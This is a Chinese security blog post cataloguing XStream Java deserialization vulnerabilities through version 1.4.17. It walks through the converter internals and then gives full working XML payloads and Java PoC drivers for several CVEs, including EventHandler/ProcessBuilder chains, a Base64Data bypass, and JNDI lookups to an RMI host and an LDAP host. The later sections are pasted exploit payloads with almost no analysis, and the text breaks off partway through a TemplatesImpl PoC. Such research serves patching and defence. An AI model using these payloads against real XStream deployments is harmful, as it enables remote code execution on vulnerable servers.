---
title: "XStream反序列化合集(Until 1.4.17)"
onlyTitle: true
date: 2024-10-31 15:23:23
categories:
- java
- 框架漏洞
tags:
- XStream
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8116.jpg
---



XStream是一个能将Java对象和XML相互转换的Java库。（脑海浮现spring 加载xml

pom.xml：

```xml
<dependency>
    <groupId>com.thoughtworks.xstream</groupId>
    <artifactId>xstream</artifactId>
    <version>1.4.6</version>
</dependency>
```



### toXML序列化

XStream在序列化对象时，对 没有实现Serializable的类 和 实现了Serializable的类并重写了readObject方法的类 的处理不同。通常我们都认为这个不同只会发生在反序列化过程中

假如有Person类：

```java
public class Person {
    private String name;
    private int age;

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
}
```

测试类，使用xStream.toXML序列化对象为XML格式

```java
import com.thoughtworks.xstream.XStream;

public class XstreamTest1 {
    public static void main(String[] args) {
        Person person = new Person("lucy", 22);
        XStream xStream = new XStream();
        String xml = xStream.toXML(person);
        System.out.print(xml);
    }
}
```

结果如下：

```java
<yourpackage.Person>
  <name>lucy</name>
  <age>22</age>
</yourpackage.Person>
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029163916052.png)

如果Person实现了Serializable接口并重写了readObject，那么相同的序列化处理结果如下：

```java
<yourpackage.Person serialization="custom">
  <yourpackage.Person>
    <default>
      <name>lucy</name>
      <age>22</age>
    </default>
  </yourpackage.Person>
</yourpackage.Person>
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029164547358.png)



### fromXML反序列化

反序列化就不用说了，会自动调用readObject

```java
public class fromXML {
    public static void main(String[] args) throws Exception{
        String xml = "<org.exploit.othercase.XStream.Person serialization=\"custom\">\n" +
                "  <org.exploit.othercase.XStream.Person>\n" +
                "    <default>\n" +
                "      <age>22</age>\n" +
                "      <name>lucy</name>\n" +
                "    </default>\n" +
                "  </org.exploit.othercase.XStream.Person>\n" +
                "</org.exploit.othercase.XStream.Person>";
        XStream xStream = new XStream();
        Person person = (Person) xStream.fromXML(xml);
        System.out.println(person);
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029164632174.png)

## 调试分析

在fromXML打上断点

fromXML调用了unmarshal

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029182521214.png)

unmarshal内部调用了ReferenceByXPathMarshallingStrategy.unmarshal

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029182620704.png)

ReferenceByXPathMarshallingStrategy内部并没有unmarshal方法，转而调用其抽象类的unmarshal

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029182837650.png)

AbstractTreeMarshallingStrategy.unmarshal调用了createUnmarshallingContext

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029182933729.png)

接着跟，调用了ReferenceByXPathUnmarshaller构造函数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029183124829.png)

就是个套娃赋值了，跳过跳过

跟到AbstractTreeMarshallingStrategy.unmarshal内的context.start

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029183547247.png)

在start方法内，通过HierarchicalStream.readClassType读取节点类型，接着调用convertAnother进行转换

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029184112273.png)

HierarchicalStream.readClassType读取的结果：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029185019906.png)

跟进到convertAnother，先是用DefualtConverterLookup.lookupConverterForType去根据类型查找converter，再调用这个converter的convert方法

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029185447284.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029185754633.png)

发现这个DefaultConverterLookup里装配了一堆converter，在哪装进去的呢？

向上逆向，发现XStream的一个构造函数内new DefaultConverterLookup

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029223139109.png)

DefaultConverterLookup类给静态变量赋值为了PrioritizedList

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029223523188.png)

XStream调用到最后的构造函数，会调用setupConverters

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029224304492.png)

setupConverters方法就根据了不同的反序列化type选择了不同的Converter

![](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241029224330467.png)

继承了Serializable并重写了readObject调用到的converter是SerializableConverter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029224612324.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029224939884.png)

如果 不实现Serializable接口 或者 只实现Serializable不重写readObject，那么converter是ReflectionConverter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241029225043696.png)

XStream的漏洞官网：

https://x-stream.github.io/security.html



### converter文件

我们随便打开一个converter文件，其中就三个主要的方法：

- canConvert方法：告诉XStream对象，它能够转换的对象；
- marshal方法：能够将对象转换为XML时候的具体操作；
- unmarshal方法：能够将XML转换为对象时的具体操作；



## CVE-2013-7285

XStream version <= 1.4.6 & XStream version = 1.4.10

漏洞点位于EventHandler.invokeInternal：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031111943717.png)

MethodUtil.invoke实际上就是Method.invoke加了异常处理，可以达到执行任意方法

EventHandler.invoke调用了invokeInternal

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031112059056.png)

EventHandler又实现了InvocationHandler接口，属于动态代理类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031112141247.png)

接下来看看invoke三个参数怎么来的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031112647537.png)

先看下EventHandler的构造函数，共设置了target、action、eventPropertyName、listenerMethodName

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031112850419.png)



invokeInternal的主要代码如下：

```java
int lastDot = action.lastIndexOf('.');
if (lastDot != -1) {
    target = applyGetters(target, action.substring(0, lastDot));
    action = action.substring(lastDot + 1);
}
Method targetMethod = Statement.getMethod(target.getClass(),action, argTypes);
return MethodUtil.invoke(targetMethod, target, newArgs);
```

> 假设action字符串为 "user.address.city"， target 是一个包含 user 属性的对象
>
> 那么经过if代码块后，target 现在是 Address 对象，action 现在是 "city"
>
> 那么经过Statement.getMethod后，获取了Address对象的city方法
>
> 简单说来就是最后一个`.`前面的是类，后面是方法

但是我们完全可以将action只传一个方法名，不含`.`，所以此处可省略，看不懂也没关系，接着往下看就知道了

现在再来看XStream提供的动态代理标签

### DynamicProxyConverter

XStream给出了各个converter对应的xml格式

https://x-stream.github.io/converters.html

其中DynamicProxyConverter适用于动态代理：

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031115841506.png)

code：

```java
<dynamic-proxy>
  <interface>com.foo.Blah</interface>
  <interface>com.foo.Woo</interface>
  <handler class="com.foo.MyHandler">
    <something>blah</something>
  </handler>
</dynamic-proxy> 
```

对照Proxy.newProxyInstance的参数来看

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031120232582.png)

`interface`标签代表了代理的接口，`handler`标签代表InvocationHandler实例，`something`标签是传递给handler的额外配置信息

POC XML：

```xml
<dynamic-proxy>
	<interface>java.util.Map</interface>
	<handler class="java.beans.EventHandler">
		<target class="java.lang.ProcessBuilder">
            <command>
                <string>calc</string>
            </command>
    	</target>
		<action>start</action>
	</handler>
</dynamic-proxy>
```

POC：

```xml
public class EventHandler {
    public static void main(String[] args) throws Exception{
        String payload = "<dynamic-proxy>\n" +
                "    <interface>java.util.Map</interface>\n" +
                "    <handler class=\"java.beans.EventHandler\">\n" +
                "        <target class=\"java.lang.ProcessBuilder\">\n" +
                "            <command>\n" +
                "        \t\t\t\t<string>calc</string>\n" +
                "            </command>\n" +
                "        </target>\n" +
                "        <action>start</action>\n" +
                "    </handler>\n" +
                "</dynamic-proxy>";
        XStream xStream = new XStream();
        Map map = (Map) xStream.fromXML(payload);
        map.size();
    }
}

```

代理一下Map接口做测试，利用了ProcesserBuilder.start

实际利用的时候需要改下代理接口为代码后续调用到的接口

那有没有办法搞个更通用的呢？

### 通用POC

* 别忘了dynamic-proxy标签外还可以嵌套标签，等于嵌套了一个converter

这里找到了TreeSetConverter：

调用了TreeMapConverter.populateTreeMap

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031150015740.png)

populateTreeMap内部，如果该标签已经在第一个元素内（没有子节点），则调用putCurrentEntryIntoMap，否则调用populateMap

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031150744928.png)

populateMap循环判断有无子节点，然后调用putCurrentEntryIntoMap

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031150937413.png)

也就是从内到外解析标签，调用putCurrentEntryIntoMap

putCurrentEntryIntoMap分别对key和value调用了readItem，这是因为Set可以存放Entry

>Map 用于存储键值对，键必须唯一，值可以重复。
>Set 用于存储唯一的键值对，不允许重复

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031151029373.png)

readItem内部又嵌套的根据Type查找converter并处理

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031151114510.png)

你一看官方给的xml示例，肯定就理解了上面的内容：

* tree-map：

```xml
<tree-map>
  <comparator class="com.blah.MyComparator"/>
  <entry>
    <string>apple</string>
    <float>123.553</float>
  </entry>
  <entry>
    <string>orange</string>
    <float>55.4</float>
  </entry>
</tree-map> 
```

* tree-set：Entry可以先只放key

```xml
<tree-set>
  <comparator class="com.blah.MyComparator"/>
  <string>apple</string>
  <string>banana</string>
  <string>cabbage</string>
</tree-set> 
```



关键在于，populateMap解析完整个tree-map内的键值对后，调用了result.putAll

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031151902279.png)

Tree.putAll的参数map是Proxy，肯定不会是SortedMap子类，进不去if，看到super.putAll

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031154835188.png)

接着调用put，这里调用的应该是TreeMap重写的put

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031155250205.png)

put内调用了compare

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031155347539.png)

用了Comparable接口的compareTo

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031155413191.png)

这里k1如果是EventHandler，那EventHandler代理Comparable接口，不就能顺利触发到invoke了嘛

POC XML：

```xml
<tree-set>
	<dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>calc</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
</tree-set>
```

POC：

```java
public class EventHandler {
    public static void main(String[] args) throws Exception{
        String payload = "<tree-set>\n" +
                "\t<dynamic-proxy>\n" +
                "        <interface>java.lang.Comparable</interface>\n" +
                "        <handler class=\"java.beans.EventHandler\">\n" +
                "            <target class=\"java.lang.ProcessBuilder\">\n" +
                "                <command>\n" +
                "                    <string>calc</string>\n" +
                "                </command>\n" +
                "            </target>\n" +
                "            <action>start</action>\n" +
                "        </handler>\n" +
                "    </dynamic-proxy>\n" +
                "</tree-set>";
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
}
```



tree-set能用，tree-map肯定也能用，毕竟tree-map的unmarshal也调用了populateTreeMap

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241031155750836.png)

随便加个value组成Entry

POC XML：

```XML
<tree-map>
    <entry>
	<dynamic-proxy>
        <interface>java.lang.Comparable</interface>
        <handler class="java.beans.EventHandler">
            <target class="java.lang.ProcessBuilder">
                <command>
                    <string>calc</string>
                </command>
            </target>
            <action>start</action>
        </handler>
    </dynamic-proxy>
    <string>godown</string>
    </entry>
</tree-map>
```

POC：

```java
public class EventHandler {
    public static void main(String[] args) throws Exception{
        String payload = "<tree-map>\n" +
                "    <entry>\n" +
                "\t<dynamic-proxy>\n" +
                "        <interface>java.lang.Comparable</interface>\n" +
                "        <handler class=\"java.beans.EventHandler\">\n" +
                "            <target class=\"java.lang.ProcessBuilder\">\n" +
                "                <command>\n" +
                "                    <string>calc</string>\n" +
                "                </command>\n" +
                "            </target>\n" +
                "            <action>start</action>\n" +
                "        </handler>\n" +
                "    </dynamic-proxy>\n" +
                "    <string>godown</string>\n" +
                "    </entry>\n" +
                "</tree-map>";
        XStream xStream = new XStream();
        xStream.fromXML(payload);
    }
}
```



### 修复

XStream>=1.4.7时，XStream能手动设置黑白名单：

```java
XStream.addPermission(TypePermission);
XStream.allowTypes(Class[]);
XStream.allowTypes(String[]);
XStream.allowTypesByRegExp(String[]);
XStream.allowTypesByRegExp(Pattern[]);
XStream.allowTypesByWildcard(String[]);
XStream.allowTypeHierary(Class);
XStream.denyPermission(TypePermission);
XStream.denyTypes(Class[]);
XStream.denyTypes(String[]);
XStream.denyTypesByRegExp(String[]);
XStream.denyTypesByRegExp(Pattern[]);
XStream.denyTypesByWildcard(String[]);
XStream.denyTypeHierary(Class);
```

1.4.10版本之后，XStream提供了XStream.setupDefaultSecurity()函数来一键设置XStream反序列化类型的默认白名单，开了这个设置的都打不了。下面都是绕过默认黑名单的



后面的绕过都不太想分析了，直接贴个POC，感觉分析的意义也不大，官网都会贴POC

## CVE-2020-26217

XStream<=1.4.13

用Base64Data绕过黑名单

```xml
<map>
    <entry>
        <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
                <dataHandler>
                    <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
                        <contentType>text/plain</contentType>
                        <is class='java.io.SequenceInputStream'>
                            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
                                <iterator class='javax.imageio.spi.FilterIterator'>
                                    <iter class='java.util.ArrayList$Itr'>
                                        <cursor>0</cursor>
                                        <lastRet>-1</lastRet>
                                        <expectedModCount>1</expectedModCount>
                                        <outer-class>
                                            <java.lang.ProcessBuilder>
                                                <command>
                                                    <string>open</string>
                                                    <string>/Applications/Calculator.app</string>
                                                </command>
                                            </java.lang.ProcessBuilder>
                                        </outer-class>
                                    </iter>
                                    <filter class='javax.imageio.ImageIO$ContainsFilter'>
                                        <method>
                                            <class>java.lang.ProcessBuilder</class>
                                            <name>start</name>
                                            <parameter-types/>
                                        </method>
                                        <name>start</name>
                                    </filter>
                                    <next/>
                                </iterator>
                                <type>KEYS</type>
                            </e>
                            <in class='java.io.ByteArrayInputStream'>
                                <buf></buf>
                                <pos>0</pos>
                                <mark>0</mark>
                                <count>0</count>
                            </in>
                        </is>
                        <consumed>false</consumed>
                    </dataSource>
                    <transferFlavors/>
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
        </jdk.nashorn.internal.objects.NativeString>
        <string>test</string>
    </entry>
</map>
```

## CVE_2021_21344

XStream<=1.4.15

JdbcRowSetImpl JNDI注入

POC XML：

```xml
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
          <packet>
            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>
                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
                      <jaxbType>com.sun.rowset.JdbcRowSetImpl</jaxbType>
                      <uriProperties/>
                      <attributeProperties/>
                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
                        <getter>
                          <class>com.sun.rowset.JdbcRowSetImpl</class>
                          <name>getDatabaseMetaData</name>
                          <parameter-types/>
                        </getter>
                      </inheritedAttWildcard>
                    </bi>
                    <tagName/>
                    <context>
                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>
                        <outer-class reference='../..'/>
                      </marshallerPool>
                      <nameList>
                        <nsUriCannotBeDefaulted>
                          <boolean>true</boolean>
                        </nsUriCannotBeDefaulted>
                        <namespaceURIs>
                          <string>1</string>
                        </namespaceURIs>
                        <localNames>
                          <string>UTF-8</string>
                        </localNames>
                      </nameList>
                    </context>
                  </bridge>
                </bridge>
                <jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
                  <javax.sql.rowset.BaseRowSet>
                    <default>
                      <concurrency>1008</concurrency>
                      <escapeProcessing>true</escapeProcessing>
                      <fetchDir>1000</fetchDir>
                      <fetchSize>0</fetchSize>
                      <isolation>2</isolation>
                      <maxFieldSize>0</maxFieldSize>
                      <maxRows>0</maxRows>
                      <queryTimeout>0</queryTimeout>
                      <readOnly>true</readOnly>
                      <rowSetType>1004</rowSetType>
                      <showDeleted>false</showDeleted>
                      <dataSource>rmi://localhost:15000/CallRemoteMethod</dataSource>
                      <params/>
                    </default>
                  </javax.sql.rowset.BaseRowSet>
                  <com.sun.rowset.JdbcRowSetImpl>
                    <default>
                      <iMatchColumns>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                      </iMatchColumns>
                      <strMatchColumns>
                        <string>foo</string>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                      </strMatchColumns>
                    </default>
                  </com.sun.rowset.JdbcRowSetImpl>
                </jaxbObject>
              </dataSource>
            </message>
            <satellites/>
            <invocationProperties/>
          </packet>
        </indexMap>
      </comparator>
    </default>
    <int>3</int>
    <string>javax.xml.ws.binding.attachments.inbound</string>
    <string>javax.xml.ws.binding.attachments.inbound</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

## CVE_2021_21345

XStream<=1.4.15

打不出网，利用ServerTableEntry本地执行恶意代码

```xml
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
          <packet>
            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>
                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>
                      <uriProperties/>
                      <attributeProperties/>
                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
                        <getter>
                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>
                          <name>verify</name>
                          <parameter-types/>
                        </getter>
                      </inheritedAttWildcard>
                    </bi>
                    <tagName/>
                    <context>
                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>
                        <outer-class reference='../..'/>
                      </marshallerPool>
                      <nameList>
                        <nsUriCannotBeDefaulted>
                          <boolean>true</boolean>
                        </nsUriCannotBeDefaulted>
                        <namespaceURIs>
                          <string>1</string>
                        </namespaceURIs>
                        <localNames>
                          <string>UTF-8</string>
                        </localNames>
                      </nameList>
                    </context>
                  </bridge>
                </bridge>
                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>
                  <activationCmd>open /Applications/Calculator.app</activationCmd>
                </jaxbObject>
              </dataSource>
            </message>
            <satellites/>
            <invocationProperties/>
          </packet>
        </indexMap>
      </comparator>
    </default>
    <int>3</int>
    <string>javax.xml.ws.binding.attachments.inbound</string>
    <string>javax.xml.ws.binding.attachments.inbound</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```



## CVE-2021-39141

XStream<=1.4.17

JNDI

```java
public class CVE_1_4_17 {
    public static void main(String[] args) throws Exception{
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <dynamic-proxy>\n" +
                "      <interface>java.lang.Comparable</interface>\n" +
                "      <handler class='com.sun.xml.internal.ws.client.sei.SEIStub'>\n" +
                "        <owner/>\n" +
                "        <managedObjectManagerClosed>false</managedObjectManagerClosed>\n" +
                "        <databinding class='com.sun.xml.internal.ws.db.DatabindingImpl'>\n" +
                "          <stubHandlers>\n" +
                "            <entry>\n" +
                "              <method>\n" +
                "                <class>java.lang.Comparable</class>\n" +
                "                <name>compareTo</name>\n" +
                "                <parameter-types>\n" +
                "                  <class>java.lang.Object</class>\n" +
                "                </parameter-types>\n" +
                "              </method>\n" +
                "              <com.sun.xml.internal.ws.client.sei.StubHandler>\n" +
                "                <bodyBuilder class='com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit'>\n" +
                "                  <indices>\n" +
                "                    <int>0</int>\n" +
                "                  </indices>\n" +
                "                  <getters>\n" +
                "                    <com.sun.xml.internal.ws.client.sei.ValueGetter>PLAIN</com.sun.xml.internal.ws.client.sei.ValueGetter>\n" +
                "                  </getters>\n" +
                "                  <accessors>\n" +
                "                    <com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2>\n" +
                "                      <val_-isJAXBElement>false</val_-isJAXBElement>\n" +
                "                      <val_-getter class='com.sun.xml.internal.ws.spi.db.FieldGetter'>\n" +
                "                        <type>int</type>\n" +
                "                        <field>\n" +
                "                          <name>hash</name>\n" +
                "                          <clazz>java.lang.String</clazz>\n" +
                "                        </field>\n" +
                "                      </val_-getter>\n" +
                "                      <val_-isListType>false</val_-isListType>\n" +
                "                      <val_-n>\n" +
                "                        <namespaceURI/>\n" +
                "                        <localPart>hash</localPart>\n" +
                "                        <prefix/>\n" +
                "                      </val_-n>\n" +
                "                      <val_-setter class='com.sun.xml.internal.ws.spi.db.MethodSetter'>\n" +
                "                        <type>java.lang.String</type>\n" +
                "                        <method>\n" +
                "                          <class>javax.naming.InitialContext</class>\n" +
                "                          <name>doLookup</name>\n" +
                "                          <parameter-types>\n" +
                "                            <class>java.lang.String</class>\n" +
                "                          </parameter-types>\n" +
                "                        </method>\n" +
                "                      </val_-setter>\n" +
                "                      <outer-class>\n" +
                "                        <propertySetters>\n" +
                "                          <entry>\n" +
                "                            <string>serialPersistentFields</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                              <type>[Ljava.io.ObjectStreamField;</type>\n" +
                "                              <field>\n" +
                "                                <name>serialPersistentFields</name>\n" +
                "                                <clazz>java.lang.String</clazz>\n" +
                "                              </field>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>CASE_INSENSITIVE_ORDER</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                              <type>java.util.Comparator</type>\n" +
                "                              <field>\n" +
                "                                <name>CASE_INSENSITIVE_ORDER</name>\n" +
                "                                <clazz>java.lang.String</clazz>\n" +
                "                              </field>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>serialVersionUID</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                              <type>long</type>\n" +
                "                              <field>\n" +
                "                                <name>serialVersionUID</name>\n" +
                "                                <clazz>java.lang.String</clazz>\n" +
                "                              </field>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>value</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                              <type>[C</type>\n" +
                "                              <field>\n" +
                "                                <name>value</name>\n" +
                "                                <clazz>java.lang.String</clazz>\n" +
                "                              </field>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>hash</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                              <type>int</type>\n" +
                "                              <field reference='../../../../../val_-getter/field'/>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\n" +
                "                          </entry>\n" +
                "                        </propertySetters>\n" +
                "                        <propertyGetters>\n" +
                "                          <entry>\n" +
                "                            <string>serialPersistentFields</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                              <type>[Ljava.io.ObjectStreamField;</type>\n" +
                "                              <field reference='../../../../propertySetters/entry/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>CASE_INSENSITIVE_ORDER</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                              <type>java.util.Comparator</type>\n" +
                "                              <field reference='../../../../propertySetters/entry[2]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>serialVersionUID</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                              <type>long</type>\n" +
                "                              <field reference='../../../../propertySetters/entry[3]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>value</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                              <type>[C</type>\n" +
                "                              <field reference='../../../../propertySetters/entry[4]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\n" +
                "                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\n" +
                "                          </entry>\n" +
                "                          <entry>\n" +
                "                            <string>hash</string>\n" +
                "                            <com.sun.xml.internal.ws.spi.db.FieldGetter reference='../../../../val_-getter'/>\n" +
                "                          </entry>\n" +
                "                        </propertyGetters>\n" +
                "                        <elementLocalNameCollision>false</elementLocalNameCollision>\n" +
                "                        <contentClass>java.lang.String</contentClass>\n" +
                "                        <elementDeclaredTypes/>\n" +
                "                      </outer-class>\n" +
                "                    </com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2>\n" +
                "                  </accessors>\n" +
                "                  <wrapper>java.lang.Object</wrapper>\n" +
                "                  <bindingContext class='com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper'/>\n" +
                "                  <dynamicWrapper>false</dynamicWrapper>\n" +
                "                </bodyBuilder>\n" +
                "                <isOneWay>false</isOneWay>\n" +
                "              </com.sun.xml.internal.ws.client.sei.StubHandler>\n" +
                "            </entry>\n" +
                "          </stubHandlers>\n" +
                "          <clientConfig>false</clientConfig>\n" +
                "        </databinding>\n" +
                "        <methodHandlers>\n" +
                "          <entry>\n" +
                "            <method reference='../../../databinding/stubHandlers/entry/method'/>\n" +
                "            <com.sun.xml.internal.ws.client.sei.SyncMethodHandler>\n" +
                "              <owner reference='../../../..'/>\n" +
                "              <method reference='../../../../databinding/stubHandlers/entry/method'/>\n" +
                "              <isVoid>false</isVoid>\n" +
                "              <isOneway>false</isOneway>\n" +
                "            </com.sun.xml.internal.ws.client.sei.SyncMethodHandler>\n" +
                "          </entry>\n" +
                "        </methodHandlers>\n" +
                "      </handler>\n" +
                "    </dynamic-proxy>\n" +
                "    <string>ldap://172.31.176.1:8085/KjidHtHH</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        XStream xStream = new XStream();
        xStream.fromXML(xml);
    }
}
```



## 不出网CVE-2021-39149

XStream<=1.4.17

TemplatesImpl

```JAVA
public class CVE_1_4_17_TemplatesImpl {
    public static void main(String[] args) throws Exception{
        String Evilcls = readClassStr();
        String payload = "<linked-hash-set>\n" +
                "    <dynamic-proxy>\n" +
                "        <interface>map</interface>\n" +
                "        <handler class='com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl'>\n" +
                "            <classToInvocationHandler class='linked-hash-map'/>\n" +
                "            <defaultHandler class='sun.tracing.NullProvider'>\n" +
                "                <active>true</active>\n" +
                "                <providerType>java.lang.Object</providerType>\n" +
                "                <probes>\n" +
                "                    <entry>\n" +
                "                        <method>\n" +
